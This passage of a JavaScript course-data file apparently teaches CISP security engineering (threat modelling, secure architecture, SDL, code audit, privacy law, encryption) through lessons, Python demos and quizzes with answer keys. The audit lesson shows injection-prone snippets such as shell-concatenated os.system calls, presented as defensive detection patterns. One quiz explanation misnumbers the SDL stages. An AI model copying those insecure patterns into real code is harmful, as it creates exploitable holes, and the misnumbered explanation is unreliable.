- 叶节点：具体的攻击动作（"输入UNION SELECT"或"发送钓鱼邮件"）

攻击树可以标注每个攻击路径的难度、成本、所需技能,帮助防御者优先加固代价最低的攻击路径。

## 学习建议
- STRIDE六个字母背熟,考试常出"S代表什么"类型题目
- 每个威胁对应的安全属性和防御手段要能关联
- DFD信任边界是实际架构评审中最常用的概念`,
codeExample:{language:'python',code:`# STRIDE威胁建模工具
s = {'S':'Spoofing(伪装)→认证性→MFA强认证',
     'T':'Tampering(篡改)→完整性→哈希+数字签名',
     'R':'Repudiation(否认)→不可否认→审计日志+签名',
     'I':'Info Disclosure(泄露)→机密性→加密+访问控制',
     'D':'DoS(拒绝服务)→可用性→冗余+限流+CDN',
     'E':'Elevation(提权)→授权→最小权限+沙箱'}
print("=== STRIDE威胁建模速查 ===")
for k,v in s.items(): print(f"  {k}: {v}")

# 攻击树模拟
print("\\n=== 攻击树: 窃取客户数据 ===")
tree = {"根":"窃取客户数据", "分支1":"通过SQL注入","叶1":"UNION SELECT提取","分支2":"社工获取凭证","叶2":"发送钓鱼邮件"}
print(f"目标: {tree['根']}")
print(f"  路径A: {tree['分支1']} → {tree['叶1']}")
print(f"  路径B: {tree['分支2']} → {tree['叶2']}")
print("\\nDFD五要素: 外部实体|处理过程|数据存储|数据流|信任边界")`,description:'STRIDE威胁模型和攻击树示例'},
quiz:[{id:'q66-1',question:'STRIDE中E代表什么威胁？',options:['Encryption加密','Elevation of Privilege权限提升','Error错误','Environment环境'],correctIndex:1,explanation:'Elevation of Privilege,普通用户获取管理员权限,违背授权属性。'},{id:'q66-2',question:'DFD的全称是什么？',options:['Data Flow Diagram数据流图','Data File Directory数据文件目录','Dynamic Flow Design动态流设计','Digital Format Document数字格式文档'],correctIndex:0,explanation:'DFD=Data Flow Diagram,用于分析系统中数据的流动路径。'},{id:'q66-3',question:'Tampering(篡改)违背了CIA中的哪个属性？',options:['保密性Confidentiality','完整性Integrity','可用性Availability','不可否认性Non-repudiation'],correctIndex:1,explanation:'篡改导致数据被未经授权修改,破坏完整性。防御:哈希、数字签名。'},{id:'q66-4',question:'攻击树的根节点通常表示什么？',options:['具体攻击工具','攻击者的最终目标','防御措施','系统配置'],correctIndex:1,explanation:'根=攻击者的最终目的(如"窃取数据"),分支和叶节点是分解的攻击路径。'},{id:'q66-5',question:'DFD中信任边界最重要的作用是什么？',options:['美化图表','标识安全域边界,决定安全控制部署位置','计算数据流量','描述用户界面'],correctIndex:1,explanation:'信任边界标识安全域分界,穿越边界的数据流需要认证、加密、输入验证等安全控制。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[66]||[],
});

allDays.push({id:'day-67',day:67,week:10,title:'安全架构设计（安全工程）',
objectives:['理解纵深防御Defense in Depth','掌握最小权限和安全默认原则','了解SABSA/NIST CSF安全架构框架'],
content:`# 安全架构设计

## 概述

安全架构设计是系统安全的基础——好的架构从设计层面就消除了大量安全问题。三大核心原则是纵深防御、最小权限和安全默认。CISP考试对此的考查通常出现在综合应用题中,需要考生能够识别场景中是否遵循了这些架构原则。

## 核心内容

### 一、纵深防御（Defense in Depth）

纵深防御是最核心的安全架构理念——**不要依赖单一安全控制,多层防护叠加**。即使某一层被攻破,后续层仍能阻止攻击。

**经典五层防御模型：**
第1层 物理安全：围墙、门禁、摄像头
第2层 网络安全：防火墙、IDS/IPS、VPN
第3层 主机安全：杀毒软件、主机防火墙、HIDS
第4层 应用安全：WAF、输入验证、输出编码
第5层 数据安全：加密存储、访问控制、审计日志

**核心逻辑：**攻击者突破第1层(翻墙)→遇到第2层(防火墙阻断)→绕过→遇到第3层(杀毒检测)→……每层都增加攻击成本和被发现概率。

**纵深防御≠重复建设：**每层关注不同维度的安全(物理/网络/主机/应用/数据),互补而非冗余。

### 二、核心安全原则

**最小权限原则（Least Privilege）：**
- 给用户/进程/系统分配完成任务所需的**最小必要权限**,不多一分
- 实践：默认角色只有读权限,写权限需申请;root/administrator账户日常不用
- 好处：即使账户被盗,攻击者能做的也有限

**安全默认原则（Secure by Default）：**
- 系统初始状态应为最安全配置
- 默认拒绝所有访问→管理者按需开放(白名单思维)
- 实践：新安装的数据库默认不监听外网、新用户默认禁用

**职责分离（SoD - Separation of Duties）：**
- 关键操作需多人协作完成,防止单人权力过大
- 案例：发起付款+b审核付款(不能同一人)、代码开发+投产上架(不能同一人)

**失效安全（Fail-Safe / Fail-Secure）：**
- 系统故障时进入安全状态而非开放状态
- 案例：防火墙断电→默认阻断所有流量(而非放行)、门禁断电→门锁保持锁定

### 三、安全架构框架

**SABSA（Sherwood Applied Business Security Architecture）：**
企业安全架构方法,从业务需求出发设计安全。分6层：业务视图→架构师视图→设计师视图→建设者视图→服务管理者视图→运营者视图。

**NIST CSF（Cybersecurity Framework）：**
五大核心功能：识别(Identify)→保护(Protect)→检测(Detect)→响应(Respond)→恢复(Recover)。最广泛采用的网络安全框架,适合任何行业。

**TOGAF安全扩展：**在企业架构框架TOGAF中嵌入安全架构视角。

## 学习建议
- 纵深防御概念必考,至少知道"多层叠加"这个核心
- 最小权限、安全默认、失效安全三个原则要区分
- NIST CSF的五功能(IPDRR)顺序记住`,
codeExample:{language:'python',code:`# 纵深防御模拟
layers = ['物理安全','网络安全','主机安全','应用安全','数据安全']
def attack(attacker_level):
    for i, layer in enumerate(layers):
        if i < attacker_level:
            print(f"  第{i+1}层 {layer}: ✓ 被突破")
        else:
            print(f"  第{i+1}层 {layer}: ✗ 阻止攻击! 攻击者在第{i+1}层被拦截")
            return False
    return True

print("=== 纵深防御模拟 ===")
print("\\n[场景A: 低级攻击者,只有网络攻击能力]")
attack(1)
print("\\n[场景B: 高级APT,有全栈攻击能力]")
attack(5)

print("\\n=== 安全设计原则速查 ===")
principles = [
    ("最小权限","仅给必要权限,不多一分"),
    ("安全默认","初始配置最安全,默认拒绝"),
    ("职责分离","关键操作需多人协作"),
    ("失效安全","故障时进入安全状态"),
]
for name,desc in principles:
    print(f"  {name}: {desc}")`,description:'纵深防御和安全设计原则'},
quiz:[{id:'q67-1',question:'纵深防御(Defense in Depth)的核心理念是什么？',options:['只依赖单一最强大的安全产品','多层安全控制叠加,任何单层失效不导致整体失陷','网络安全最重要,其他层次要','只在边界部署防火墙就够了'],correctIndex:1,explanation:'多层防御确保即使一层被突破,后续层仍提供保护。'},{id:'q67-2',question:'安全默认(Secure by Default)的正确理解？',options:['默认开放所有功能,用户自行关闭','默认关闭/拒绝,管理员按需开放','默认信任所有请求','默认使用最高权限账户'],correctIndex:1,explanation:'系统初始状态最安全,采用白名单思维——默认拒绝,按需开放。'},{id:'q67-3',question:'SABSA是一个什么样的框架？',options:['加密算法标准','企业安全架构框架','防火墙规则标准','渗透测试框架'],correctIndex:1,explanation:'SABSA是从业务需求出发设计安全的架构方法,分为6层视图。'},{id:'q67-4',question:'失效安全(Fail-Safe)的含义是？',options:['系统永远不会故障','故障时自动进入安全/锁定状态而非开放状态','失效后自动重启','失效后允许所有人访问'],correctIndex:1,explanation:'防火墙断电→默认阻断(不放开),门禁断电→门锁保持锁定。故障≠开放。'},{id:'q67-5',question:'NIST CSF的五大核心功能顺序是？',options:['检测→响应→识别→保护→恢复','识别→保护→检测→响应→恢复','保护→识别→恢复→检测→响应','响应→检测→恢复→保护→识别'],correctIndex:1,explanation:'IPDRR: Identify→Protect→Detect→Respond→Recover。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[67]||[],
});

allDays.push({id:'day-68',day:68,week:10,title:'安全开发生命周期（安全工程）',
objectives:['掌握SDL七阶段','理解DevSecOps安全左移理念','了解SAST/DAST/IAST/SCA各类安全测试'],
content:`# SDL安全开发生命周期

## 概述

SDL（Security Development Lifecycle）是微软提出的将安全嵌入软件开发全过程的方法论。传统的"开发完再测安全"模式已经过时,现代实践是DevSecOps——将安全左移至开发最早阶段。CISP考试重点考查SDL的七个阶段和各类安全测试工具的区别。

## 核心内容

### 一、SDL七阶段

**第1阶段：培训（Training）**
对开发、测试、项目管理人员进行安全意识和技术培训。覆盖：OWASP Top 10、安全编码、隐私保护、威胁建模。培训是SDL的基础——意识不到位,后续措施都白费。

**第2阶段：需求（Requirements）**
在需求阶段就定义安全需求和隐私需求。建立安全质量关卡(Bug Bar)——定义什么级别的漏洞必须在发布前修复,什么可以延后。做初步风险评估。

**第3阶段：设计（Design）**
进行威胁建模（STRIDE方法）。分析攻击面,尽可能缩小（关闭不需要的端口/服务/API）。遵循安全设计原则（最小权限、纵深防御）。

**第4阶段：实现（Implementation）**
使用SAST工具进行静态代码分析。遵循安全编码规范（禁用危险函数如strcpy/sprintf、使用参数化查询）。代码审查关注安全。禁用不安全API和函数。

**第5阶段：验证（Verification）**
DAST动态测试运行中的应用。IAST交互式测试（插桩方式同时分析源码和运行时行为）。模糊测试（Fuzzing）自动发送随机/畸形输入。渗透测试模拟真实攻击。

**第6阶段：发布（Release）**
最终安全审查（FSR）——确认所有安全要求被满足。制定应急响应计划——如果发布后发现漏洞怎么办。

**第7阶段：响应（Response）**
执行应急响应计划。快速修复漏洞,发布安全更新。复盘（Postmortem）——为什么这个漏洞没被SDL发现？如何改进流程？

### 二、DevSecOps：安全左移

传统模式：开发(Dev) → 运维(Ops) → 最后才安全(Sec) = 上线前紧急修漏洞,或者带着漏洞上线

DevSecOps模式：安全从第一天就嵌入Dev和Ops流程：
- CI/CD Pipeline中集成SAST（提交时自动扫描）
- 构建制品后SCA检查依赖漏洞
- 部署到测试环境时DAST自动测试
- 容器镜像上线前自动扫描
- 运行时的RASP保护

**核心理念：安全不是"最后的检查项",而是贯穿全程的自动化过程。**

### 三、安全测试类型对比

| 测试类型 | 阶段 | 代表工具 | 优势 | 劣势 |
|---------|------|---------|------|------|
| SAST | 编码 | SonarQube,Semgrep | 早发现,成本低 | 误报多,不检查运行时 |
| DAST | 测试 | OWASP ZAP,Burp | 模拟真实攻击 | 晚发现,成本高 |
| IAST | 测试 | Contrast,Seeker | 结合源码+运行时 | 需插桩,有性能开销 |
| SCA | 构建 | Snyk,BlackDuck | 检查开源组件漏洞 | 仅覆盖已知CVE |

## 学习建议
- SDL七阶段顺序记住：培训→需求→设计→实现→验证→发布→响应
- SAST(白盒)和DAST(黑盒)的区别是考试必考点
- DevSecOps的核心是"安全左移"`,
codeExample:{language:'python',code:`# SDL七阶段速查
sdl = ['1.培训','2.需求','3.设计','4.实现','5.验证','6.发布','7.响应']
print("=== SDL安全开发生命周期 ===")
for s in sdl: print(f"  {s}")

# 安全测试类型对比
print("\\n=== 安全测试工具类型 ===")
tests = {"SAST":"白盒|编码阶段|SonarQube/Semgrep|分析源码",
         "DAST":"黑盒|测试阶段|OWASP ZAP/Burp|动态测试",
         "IAST":"交互|测试阶段|Contrast/Seeker|源码+运行时",
         "SCA":"组件|构建阶段|Snyk/Dependabot|检查依赖"}
for name,desc in tests.items(): print(f"  {name}: {desc}")

print("\\nDevSecOps核心理念: 安全左移,从第一天开始自动化")`,description:'SDL生命周期和安全测试工具'},
quiz:[{id:'q68-1',question:'SDL七个阶段的第一步是什么？',options:['需求分析','安全设计','安全意识培训','代码审查'],correctIndex:2,explanation:'培训是SDL基础——开发人员意识到安全重要性,后续措施才有意义。'},{id:'q68-2',question:'SAST(静态应用安全测试)在哪个阶段执行？',options:['编码完成后无需运行程序','运行中的测试环境','上线之后','需求分析阶段'],correctIndex:0,explanation:'SAST分析源代码/字节码,不运行程序。白盒测试,开发阶段即可执行。'},{id:'q68-3',question:'DevSecOps的核心理念是？',options:['先开发后安全','安全左移——从开发最早阶段集成安全','安全由专人负责,开发不管','上线后再做安全测试'],correctIndex:1,explanation:'Shift Left=将安全尽早集成到CI/CD Pipeline中,而非开发完成后才检查。'},{id:'q68-4',question:'IAST与SAST+DAST的最大区别？',options:['IAST更慢','IAST通过插桩同时分析源码和运行时','IAST更便宜','IAST是免费的'],correctIndex:1,explanation:'IAST在应用中插入探针,既能访问源码上下文(SAST优势),又能捕获运行时行为(DAST优势)。'},{id:'q68-5',question:'SCA(软件成分分析)主要检查什么？',options:['自己写的代码','开源组件和依赖库的已知漏洞','网络配置','数据库性能'],correctIndex:1,explanation:'SCA检查项目引用的开源组件是否存在已知CVE漏洞和许可证合规问题。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[68]||[],
});

allDays.push({id:'day-69',day:69,week:10,title:'代码审计（安全工程）',
objectives:['掌握自上而下和自下而上两种审计方法','了解Semgrep/SonarQube等审计工具','熟记常见代码漏洞的审计模式'],
content:`# 代码审计

## 概述

代码审计是通过人工或工具检查源代码,发现安全漏洞的活动。它是SAST实现的基础——SAST工具自动化的正是人工审计的经验规则。代码审计分两种方法论：自上而下（从用户输入追踪到危险函数）和自下而上（从危险函数回溯到用户输入）。

## 核心内容

### 一、两种审计方法论

**自上而下（Top-Down / Forward Trace）：**
从用户输入入口出发,追踪数据流直至危险函数。
- 入口点：HTTP请求参数、文件上传、Cookie、数据库读取
- 追踪规则：跟踪输入变量经过哪些函数变换（拼接/截取/编码）
- 终点：到达SQL查询、命令执行、文件操作等危险函数时检查是否安全

**优势：**覆盖所有用户可控制的攻击面,全面性好。
**劣势：**容易陷入大量无关的数据流,效率较低。

**自下而上（Bottom-Up / Backward Trace）：**
先列出所有危险函数,反向追踪其参数是否受用户控制。
- 起点：os.system、subprocess.Popen、eval、popen、fopen等
- 追踪规则：反向查看参数变量来源
- 终点：追溯到用户输入→存在漏洞

**优势：**快速定位高危点,效率高。
**劣势：**可能遗漏不常见或自定义的危险函数。

**推荐：混合使用——先用自下而上快速定位高危点,再自上而下做全面检查。**

### 二、审计工具

**Semgrep：**
开源的语义分析工具,用YAML规则匹配代码模式。支持30+语言。规则即代码,可定制。
示例规则：匹配所有直接拼接SQL字符串的代码 \`"SELECT" + input\` → 报告SQL注入风险

**SonarQube：**
企业级代码质量和安全平台,支持自动扫描、技术债务量化。内置OWASP Top 10等安全规则集。

**Checkmarx：**
商业SAST工具,支持跨文件数据流分析,适用于大型企业。

### 三、审计七大检查点

**1. 输入验证：**是否所有用户输入都经过验证？是否存在直接信任用户输入的代码？
**2. 输出编码：**动态输出到HTML/JS/URL时是否做了上下文编码？
**3. 认证授权：**敏感接口是否做了权限检查？是否存在越权风险？
**4. 会话管理：**Token是否随机？是否设置HttpOnly/Secure/SameSite？
**5. 加密实现：**是否使用了不安全的算法(MD5/DES/ECB)？密钥是否硬编码？
**6. 错误处理：**异常是否暴露内部信息（栈轨迹/SQL语句/文件路径）？
**7. 日志记录：**关键操作是否记录？日志中是否误记录了敏感数据（密码/令牌）？

### 四、常见漏洞审计模式

**SQL注入模式：**查找字符串拼接构造SQL → \`"SELECT * FROM users WHERE id=" + user_id\`
**XSS模式：**查找未编码输出 → \`innerHTML =\`、\`document.write(\`、Vue的\`v-html\`
**命令注入：**查找调用系统命令 → \`os.system("ping " + user_input)\`、\`subprocess.call(user_input, shell=True)\`
**路径遍历：**查找文件操作拼接路径 → \`open("/var/www/" + filename)\`
**SSRF模式：**查找用户控制的URL请求 → \`requests.get(user_url)\`、\`curl_exec(user_url)\`

## 学习建议
- 自上而下(入口→函数)和自下而上(函数→入口)要能区分
- Semgrep是开源首选,考试可能提及
- 七大检查点要能在代码中识别出来`,
codeExample:{language:'python',code:`# 代码审计检查清单和漏洞模式
audit_checks = {
    "SQL注入": ("查找字符串拼接构造SQL","使用参数化查询或ORM"),
    "XSS":     ("查找未编码输出innerHTML/document.write","使用DOMPurify或自动转义"),
    "命令注入": ("查找os.system/subprocess中用户拼接","subprocess.run([cmd,arg],shell=False)"),
    "路径遍历": ("查找文件操作中用户控制的路径","白名单+路径规范化os.path.realpath"),
    "SSRF":    ("查找用户控制的URL请求","URL白名单+内网地址黑名单"),
    "反序列化": ("查找pickle.loads/unserialize","使用json代替pickle,序列化白名单"),
}
print("=== 代码审计常见漏洞模式 ===")
for vuln, (pattern, fix) in audit_checks.items():
    print(f"[{vuln}]")
    print(f"  审计模式: {pattern}")
    print(f"  修复方式: {fix}")

print("\\n审计方法论:")
print("  自上而下: 用户输入入口 → 追踪数据流 → 危险函数")
print("  自下而上: 危险函数列表 → 回溯参数来源 → 用户输入")
print("  推荐混合: 自下而上快速定高危+自上而下全面检查")`,description:'代码审计漏洞模式和检查方法'},
quiz:[{id:'q69-1',question:'Semgrep是什么类型的工具？',options:['Web应用防火墙','基于规则的语义代码分析工具','漏洞扫描器','渗透测试框架'],correctIndex:1,explanation:'Semgrep是开源静态分析工具,用YAML规则匹配代码安全模式。'},{id:'q69-2',question:'自上而下(Top-Down)审计的起点是什么？',options:['危险函数列表','用户输入入口','数据库查询','配置文件的密码'],correctIndex:1,explanation:'从HTTP参数、文件上传等用户可控入口出发,追踪数据如何处理直到危险函数。'},{id:'q69-3',question:'代码审计时,以下哪种模式暗示可能存在命令注入？',options:['使用了参数化查询','os.system()调用中拼接用户输入','数据库查询使用ORM','密码使用bcrypt加密'],correctIndex:1,explanation:'os.system(\"ping \"+user_ip)中用户输入直接拼入系统命令,是典型的命令注入模式。'},{id:'q69-4',question:'SonarQube支持的安全分析功能不包括？',options:['代码质量分析','OWASP Top 10漏洞检测','运行时入侵检测','技术债务量化'],correctIndex:2,explanation:'SonarQube是静态代码分析(SAST)工具,不具备运行时入侵检测(RASP/IDS)功能。'},{id:'q69-5',question:'自下而上审计中,回溯追踪的终点是什么？',options:['危险函数','代码最后一行','判断参数来源是否受用户控制','数据库'],correctIndex:2,explanation:'从危险函数反向追踪参数的变量来源,如果能追溯到用户输入(request/input/file),则存在漏洞。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[69]||[],
});

allDays.push({id:'day-70',day:70,week:10,title:'第十周总结与测验（安全工程）',
objectives:['回顾安全评估核心知识','总结威胁建模和架构设计','综合测验'],
content:`# 第十周总结与测验

## 本周知识体系回顾

### Day 64 - 安全评估概述
核心框架：资产识别→威胁识别→脆弱性识别→风险计算(R=A×T×V)→五类处置
关键公式：ALE=SLE×ARO, STRIDE六维威胁模型

### Day 65 - 风险评估方法
定量：ALE=SLE×ARO,SLE=AV×EF（货币金额化）
定性：风险矩阵(可能性×影响→等级)
处置：规避/减缓/转移/接受四种策略

### Day 66 - 威胁建模
STRIDE：Spoofing→认证/Tampering→完整性/Repudiation→不可否认/InfoDisclosure→机密性/DoS→可用性/Elevation→授权
DFD五要素、攻击树(根→分支→叶)

### Day 67 - 安全架构设计
纵深防御：五层叠加(物理→网络→主机→应用→数据)
核心原则：最小权限、安全默认、职责分离、失效安全
框架：SABSA(企业架构)、NIST CSF(识别→保护→检测→响应→恢复)

### Day 68 - SDL安全开发生命周期
七阶段：培训→需求→设计→实现→验证→发布→响应
DevSecOps核心：安全左移
测试类型：SAST(白盒)、DAST(黑盒)、IAST(插桩)、SCA(组件)

### Day 69 - 代码审计
方法：自上而下(入口追踪)、自下而上(函数回溯)、混合
工具：Semgrep/SonarQube/Checkmarx
检查点：输入验证、输出编码、认证授权、会话管理、加密、错误处理、日志

## 高频考点速记

| 考点 | 关键概念 |
|------|---------|
| ALE公式 | ALE=SLE×ARO, SLE=AV×EF |
| STRIDE | 六维度对应六安全属性 |
| 纵深防御 | 多层叠加,不依赖单层 |
| SDL第一步 | 安全意识培训 |
| SAST vs DAST | SAST白盒静态,DAST黑盒动态 |
| DevSecOps | 安全左移,早期集成 |
| 代码审计 | 自上而下(入口→函数)+自下而上(函数→入口) |

## 综合测验`,
codeExample:{language:'python',code:`# 第十周安全工作知识体系
print("=== 安全工程知识体系 ===")
print("\\n[风险评估] 资产识别→威胁→脆弱性→计算(ALE=SLE×ARO)→处置")
print("[威胁建模] STRIDE: S伪装/T篡改/R否认/I泄露/D拒绝/E提权")
print("[安全架构] 纵深防御+最小权限+安全默认+失效安全")
print("[SDL] 培训→需求→设计→实现→验证→发布→响应")
print("[DevSecOps] 安全左移,嵌入CI/CD Pipeline")
print("[测试] SAST(白盒)+DAST(黑盒)+IAST(交互)+SCA(组件)")
print("[审计] 自上而下(入口→函数)+自下而上(函数→入口)")
print("\\nNIST CSF: 识别→保护→检测→响应→恢复(IPDRR)")`,description:'安全工程知识体系总结'},
quiz:[{id:'q70-1',question:'ALE(年度预期损失)的计算公式是？',options:['Annual Loss Expectancy = SLE×ARO','Application Level Event','Authentication Layer Engine','Access Log Entry'],correctIndex:0,explanation:'ALE=SLE(单次损失)×ARO(年发生率)。'},{id:'q70-2',question:'纵深防御(Defense in Depth)的英文和核心理念？',options:['Deep Defense,越深越好','Defense in Depth,多层控制叠加','Multi Defense,多产品部署','Layered Security,防火墙为主'],correctIndex:1,explanation:'Defense in Depth=多层叠加,每层不同维度,互为补充。'},{id:'q70-3',question:'SAST和DAST的核心区别是什么？',options:['无区别','SAST白盒分析源码,DAST黑盒测试运行时','SAST更贵','DAST开发阶段用'],correctIndex:1,explanation:'SAST(Static)静态分析源码不运行,DAST(Dynamic)动态测试运行中的应用。'},{id:'q70-4',question:'代码审计中,混合审计方法的含义是？',options:['只用一种方法','自上而下和自下而上结合使用','随机选择','只审计关键文件'],correctIndex:1,explanation:'先用自下而上快速定位高危函数,再自上而下全面追踪所有输入路径。'},{id:'q70-5',question:'SDL生命周期最后两个阶段是什么？',options:['设计和实现','验证和发布','发布和响应','培训和需求'],correctIndex:2,explanation:'7.发布(最终安全审查)→8.响应(应急响应计划执行+复盘)。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[70]||[],
});

// ============================================================
// WEEK 11: 业务安全 (Day 71-77)
// ============================================================

allDays.push({id:'day-71',day:71,week:11,title:'隐私保护（业务安全）',
objectives:['掌握《个人信息保护法》(PIPL)核心原则','理解数据主体的七项权利','了解隐私设计(PbD)七大原则'],
content:`# 隐私保护

## 概述

《中华人民共和国个人信息保护法》(PIPL)于2021年11月1日正式施行,是中国隐私保护领域的根本性法律。任何处理中国公民个人信息的组织,无论境内境外,都受其约束。CISP考试中对隐私保护的考查逐年增多。

## 核心内容

### 一、PIPL核心处理原则

个人信息处理者必须遵守七项基本原则：

1. **合法、正当、必要、诚信**——不得以欺骗、误导方式收集
2. **目的限制**——收集有明确目的,不得超出范围使用
3. **数据最小化**——仅收集完成目的所需的最少数据,能少则少
4. **公开透明**——告知用户谁在收集、收集什么、用在哪里、存多久
5. **质量保证**——确保个人信息的准确性和及时更新
6. **安全保障**——采取技术和管理措施防止泄露、篡改、丢失
7. **责任明确**——谁处理谁负责,处理者是第一责任人

**关键点：**违反PIPL最高可处罚上一年度营业额5%的罚款,并可能追究刑事责任。

### 二、数据主体的七项权利

1. **知情权：**有权知晓个人信息被收集、使用的方式和范围
2. **访问权（查阅权）：**有权向处理者请求查看自己的数据
3. **更正权：**发现错误或不完整,有权要求更正
4. **删除权（被遗忘权）：**在特定情况下有权要求删除——目的已实现、超期保存、撤回同意、违法处理
5. **限制处理权：**在争议期间有权要求限制对数据的处理
6. **可携带权：**有权要求将自己的数据转移到其他处理者
7. **反对权：**有权反对基于直接营销和自动化决策的数据处理

**记忆口诀：知-查-改-删-限-带-反**

### 三、PbD隐私设计七大原则

Privacy by Design由加拿大隐私专家Ann Cavoukian提出：

1. **主动预防而非被动补救**——预防隐私问题而非事后解决
2. **隐私作为默认设置**——默认最大隐私保护,用户无需采取行动
3. **隐私嵌入设计**——将隐私融入系统和业务流程设计,不是外挂
4. **正和而非零和**——隐私和安全可以兼得,不是二选一
5. **全生命周期保护**——从数据收集到销毁的全流程保护
6. **可见性和透明性**——数据处理对用户公开透明
7. **尊重用户隐私**——以用户为中心,保护用户利益

### 四、个人信息分类

**一般个人信息：**姓名、电话、邮箱、工作单位等
**敏感个人信息（需单独同意）：**身份证号、生物识别(指纹/人脸)、金融账户、行踪轨迹、医疗健康、14岁以下未成年人信息

敏感信息处理要求更高：必须取得单独同意、告知必要性、进行影响评估。

## 学习建议
- PIPL七项原则和数据主体七项权利要能一一对应
- 区分一般个人信息和敏感个人信息
- PbD的七个原则中"隐私默认"和"主动预防"最重要`,
codeExample:{language:'python',code:`# 隐私合规检查清单
pipl_checklist = {
    "告知义务": "是否明确告知用户收集目的、范围、保存期限?",
    "同意获取": "敏感信息是否获得单独同意(非捆绑)?",
    "数据最小化": "是否仅收集必要数据?有无过度收集?",
    "数据安全": "是否加密存储?访问控制是否就绪?",
    "用户权利": "是否提供数据查阅、更正、删除的渠道?",
    "出境评估": "数据是否出境?若出境是否完成安全评估?",
}

print("=== PIPL合规检查清单 ===")
for item, check in pipl_checklist.items():
    print(f"  [{item}] {check}")

print("\\n数据主体七项权利: 知→查→改→删→限→带→反")
print("敏感个人信息: 身份证/生物识别/金融账户/行踪/健康/未成年人")`,description:'隐私法规合规检查'},
quiz:[{id:'q71-1',question:'《中华人民共和国个人信息保护法》的施行日期是？',options:['2021年6月1日','2021年9月1日','2021年11月1日','2022年1月1日'],correctIndex:2,explanation:'PIPL于2021年11月1日正式施行。'},{id:'q71-2',question:'数据最小化原则要求？',options:['尽可能多地收集数据以备后用','仅收集和处理完成目的所需的最少数据','数据越多越有价值','由技术可行性决定收集量'],correctIndex:1,explanation:'PIPL明确要求数据最小化——能少则少,不过度收集。'},{id:'q71-3',question:'Privacy by Design的核心理念是？',options:['隐私是最后考虑的附加项','隐私从设计之初就内置的系统属性','隐私由安全团队独立负责','隐私合规是法务部门的工作'],correctIndex:1,explanation:'PbD主张隐私是系统设计的固有属性,应在设计阶段就主动考虑,而非事后补救。'},{id:'q71-4',question:'以下哪项属于敏感个人信息？',options:['姓名','工作邮箱','生物识别信息(指纹/人脸)','办公电话'],correctIndex:2,explanation:'身份证号、生物识别、金融账户、行踪、健康等属于敏感信息,需单独同意。'},{id:'q71-5',question:'数据主体的删除权(被遗忘权)适用条件不包括？',options:['处理目的已实现','超期保存','用户要求数据处理加速','违法处理'],correctIndex:2,explanation:'删除权适用:目的实现/超期/撤回同意/违法。加速处理不是删除权的适用条件。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[71]||[],
});

allDays.push({id:'day-72',day:72,week:11,title:'数据加密存储（业务安全）',
objectives:['了解数据加密的分层架构','掌握HSM和密钥生命周期管理','理解透明加密(E2EE/TDE)'],
content:`# 数据加密存储

## 概述

数据加密是保护静态数据的最后一道防线——即使数据库被盗、硬盘丢失,加密也能确保数据不可读。加密不是"一个方案",而是分层架构：不同层级需要不同的加密策略。CISP考试中重点考查加密层次、HSM硬件安全模块和密钥生命周期管理。

## 核心内容

### 一、加密分层架构

从应用到磁盘,四个加密层次：

**第1层 应用层加密：**
在应用代码中加密特定字段（如信用卡号、身份证号）。最灵活——开发者控制哪些字段加密、用什么算法。但密钥管理复杂,每个应用自己处理。

**第2层 数据库加密（TDE透明数据加密）：**
数据库引擎自动加密数据文件和日志。对应用透明,无需修改代码。主流产品：SQL Server TDE、Oracle TDE、MySQL InnoDB加密。
优点：实施简单,应用无感知。缺点：数据库进程可解密,不能防御应用层攻击。

**第3层 文件系统加密：**
操作系统级别加密整个文件系统——BitLocker(Windows)、LUKS(Linux)、FileVault(Mac)。对整个分区/磁盘加密。防止物理丢失导致的泄露。
优点：操作系统管理,全盘保护。缺点：系统运行时自动解密,不能防在线攻击。

**第4层 磁盘加密（SED自加密磁盘）：**
硬盘固件级别的硬件加密。密钥存储在硬盘控制器中,操作系统完全无感知。
优点：完全不消耗CPU,全透明。缺点：仅防物理取出,不能防逻辑攻击。

**选择策略：不是四选一,而是四层叠加——应用层加密敏感字段+数据库TDE+文件系统BitLocker+物理安全=纵深加密防御**

### 二、HSM硬件安全模块

HSM（Hardware Security Module）是专用的密码硬件设备,提供：
- 安全的密钥生成（真随机数发生器）
- 密钥安全存储（防篡改、防导出）
- 密码运算加速（RSA/ECC/AES硬件加速）
- 符合法规（FIPS 140-2 Level 3认证）

**HSM的核心价值：**密钥永远不会离开HSM设备——即使服务器被完全攻破,攻击者也无法导出HSM中的密钥。

**使用场景：**银行发卡密钥、CA数字证书签名密钥、支付行业PCI PTS认证

### 三、密钥生命周期管理

密钥与普通数据不同——从生成到销毁,每个阶段都需要管理：

1. **生成：**使用密码学安全的随机数生成器。密钥长度足够(AES≥256位,RSA≥2048位)
2. **分发：**传输密钥必须通过安全信道(如HSM到HSM通信)。绝不通过邮件/短信传输
3. **使用：**内存中仅保留密钥所需的最短时间。用后立即清零
4. **存储：**仅以加密形式存储。访问需审计
5. **轮换：**定期更换密钥。轮换周期=密钥有效期。旧密钥保留用于解密历史数据
6. **销毁：**彻底删除所有副本。密钥从HSM中删除后不可恢复

### 四、加密策略速查

| 场景 | 推荐方案 |
|------|---------|
| 静态数据加密 | AES-256-GCM |
| 传输数据加密 | TLS 1.3 |
| 密钥管理 | KMS/HSM |
| 端到端通信 | E2EE(Signal协议) |
| 密码存储 | bcrypt/argon2(不可逆) |

## 学习建议
- 加密分层不是互斥的,实践中通常叠加使用
- HSM的核心卖点是"密钥不可导出"
- 密钥轮换是合规的基本要求,不能忘`,
codeExample:{language:'python',code:`from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

def demo_aes_encryption():
    """演示AES-256-GCM加密（应用层加密示例）"""
    # 生成256位(32字节)密钥
    key = get_random_bytes(32)
    cipher = AES.new(key, AES.MODE_GCM)
    nonce = cipher.nonce
    
    # 加密
    plaintext = b"Sensitive Data: Credit Card 1234-5678-9012-3456"
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    print(f"原文: {plaintext.decode()}")
